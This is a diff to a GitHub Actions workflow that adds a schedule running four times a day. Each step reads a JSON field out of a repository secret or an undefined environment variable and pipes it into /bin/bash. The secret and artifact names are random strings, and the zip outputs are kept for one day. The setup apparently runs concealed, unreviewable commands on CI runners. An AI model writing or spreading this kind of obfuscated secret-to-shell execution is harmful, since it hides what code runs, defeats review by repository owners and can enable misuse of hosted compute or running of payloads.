@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '47 0,6,12,18 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,14 +14,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          rux40209: ${{ secrets.rux40209 }}
+          vvz34496: ${{ secrets.vvz34496 }}
         run: |
-          printf '%s' "$rux40209" | jq -r .yqc17 | /bin/bash
-          echo $i78501 | jq -r .biutu5400 | /bin/bash
+          printf '%s' "$vvz34496" | jq -r .rz71866 | /bin/bash
+          printf '%s' "$ost24" | jq -r .koak930 | /bin/bash
+          printf '%s' "$uuskh067" | jq -r .alr2 | /bin/bash
+          printf '%s' "$zg93" | jq -r .b717 | /bin/bash
+          printf '%s' "$c875" | jq -r .zc328 | /bin/bash
+          printf '%s' "$vmxi7" | jq -r .n99519 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: sk2suy3Y
+          name: 9YlFlsW7
           path: "*.zip"
           retention-days: 1
